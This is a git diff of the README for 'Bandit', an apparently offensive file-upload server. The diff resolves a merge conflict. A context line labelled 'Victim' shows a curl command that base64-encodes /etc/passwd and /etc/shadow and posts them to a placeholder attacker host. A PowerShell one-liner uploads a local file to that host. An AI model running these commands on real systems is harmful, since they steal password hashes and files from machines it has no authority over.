@@ -16,14 +16,11 @@ If you wish to overwrite the existing files, instead of failing to upload if the
 
 Victim: ```curl -d "passwd=$(base64 /etc/passwd)&shadow=$(base64 /etc/shadow)" http://yourip:port/overwrite```
 
-<<<<<<< HEAD
 Bandit is also compatible with Windows Powershell, although usage is not as straightforward. To save you some time, here is a oneliner to upload a single file, filename.txt, to the remote server as uploadedfile:
 
 ```if ($PWD.Provider.Name -eq 'FileSystem') { [System.IO.Directory]::SetCurrentDirectory($PWD) } ; Invoke-WebRequest -Uri http://yourip:port -Method POST -Body @{uploadedfile=[Convert]::ToBase64String([IO.File]::ReadAllbytes("filename.txt"))}```
-=======
+
+
 Note that bandit supports multiple files uploaded at the same time. Simply add as many parameters as you wish, one for each file, in the following format:
 
 [desired filename]=[base64 encoded contents]
-
-The simplicity of the protocol makes it easy to use one-liners to upload files, or create custom wrapper scripts for more thorough uploads. 
->>>>>>> 4ac9430564bcebac23691431249b41c5f23db3e5
